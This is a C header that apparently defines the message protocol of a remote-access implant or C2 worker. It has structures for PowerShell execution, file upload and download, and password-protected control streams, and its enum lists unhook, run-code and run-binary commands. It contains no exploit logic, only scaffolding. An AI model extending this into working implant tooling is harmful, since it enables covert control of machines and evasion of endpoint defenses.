#pragma once

/*
	Look away.
	I have wielded macros in the most unholy manner.
	I will have to repent for my crimes against C.
	One day, they will catch up.

	I am just a man.
*/

#include "tremont.h"

#define STREAM_PASS_LEN 64

#define SIMPLE_FIN(job_type) struct job_type##_fin_t { uint8_t sanity; }
#define SIMPLE_FAK(job_type) struct job_type##_fak_t { uint8_t sanity; }

#define ALLOWED_RES(job_type) struct job_type##_res_t { uint8_t allowed; }

#define REQ_TEMPLATE_BEGIN(job_type) \
	struct job_type##_req_t {  \
		uint8_t sanity

#define REQ_TEMPLATE_END(job_type) }

#define MSG_TEMPLATE_BEGIN(job_type) \
	struct job_type##_msg_t { \
		enum wrkr_verb_enum_t msg_enum

#define MSG_TEMPLATE_END(job_type) }

enum wrkr_verb_enum_t {
	REQ,
	RES,
	FIN,
	FAK
};

/*
	Control messages are sent on the control stream.

	uint8_t 'allowed' fields are booleans, 1 = true, 0 = false
	uint8_t fields called 'sanity' should be set to one upon creation.
*/

struct _new_stream_info {
	tremont_stream_id stream_id;
	char password[STREAM_PASS_LEN];
};

/* -- POWERSHELL -- */

REQ_TEMPLATE_BEGIN(powershell);
REQ_TEMPLATE_END(powershell);

ALLOWED_RES(powershell);
SIMPLE_FIN(powershell);
SIMPLE_FAK(powershell);

MSG_TEMPLATE_BEGIN(powershell);
union {
	struct powershell_req_t req;
	struct powershell_res_t res;
	struct powershell_fin_t fin;
	struct powershell_fak_t fak;
};
MSG_TEMPLATE_END(powershell);

/* -- UPLOAD: SEND TO ENDPOINT -- */

REQ_TEMPLATE_BEGIN(upload);
char dest_path[255];
size_t dest_path_len;

int64_t file_len;
REQ_TEMPLATE_END(upload);

ALLOWED_RES(upload);
SIMPLE_FIN(upload);
SIMPLE_FAK(upload);

MSG_TEMPLATE_BEGIN(upload);
	union {
		struct upload_req_t req;
		struct upload_res_t res;
		struct upload_fin_t fin;
		struct upload_fak_t fak;
	};
MSG_TEMPLATE_END(upload);

/* -- DOWNLOAD: GET FROM ENDPOINT -- */

REQ_TEMPLATE_BEGIN(download);
char path[255];
size_t path_len;
REQ_TEMPLATE_END(download);

struct download_res_t { uint32_t file_size; };

SIMPLE_FIN(download);
SIMPLE_FAK(download);

MSG_TEMPLATE_BEGIN(download);
union {
	struct download_req_t req;
	struct download_res_t res;
	struct download_fin_t fin;
	struct download_fak_t fak;
};
MSG_TEMPLATE_END(upload);

enum wrkr_msg_enum_t {
	POWERSHELL,
	UPLOAD,
	DOWNLOAD,
	UNHOOK_L,
	UNHOOK_BYON,
	RUN_CODE,
	RUN_BIN
};

struct wrkr_msg_t {
	enum wrkr_msg_enum_t msg_enum;
	union wrkr_msg_contents {
		struct powershell_msg_t powershell;
		struct upload_msg_t upload;
		struct download_msg_t download;
		/*
			struct unhookl_msg_t unhookl;
			struct unhookbyon_msg_t unhookbyon;
			struct runcode_msg_t runcode;
			struct runbin_msg_t runbin;
		*/
	};
};

enum new_thread_enum_t {
	T_REQ,
	T_RES
};

struct new_thread_msg_t {
	enum new_thread_enum_t new_thread_enum;
	struct _new_stream_info stream_info;
};

struct heartbeat_msg_t {
	uint8_t sanity;
};

struct disconnect_msg_t {
	uint8_t sanity;
};

enum ctrl_msg_enum_t {
	NEW_THREAD,
	HEARTBEAT,
	DISCONNECT
};

struct ctrl_msg_t {
	enum ctrl_msg_enum_t msg_enum;
	union ctrl_msg_contents {
		struct new_thread_msg_t new_thread;
		struct heartbeat_msg_t heartbeat;
		struct disconnect_msg_t disconnect;
	};
};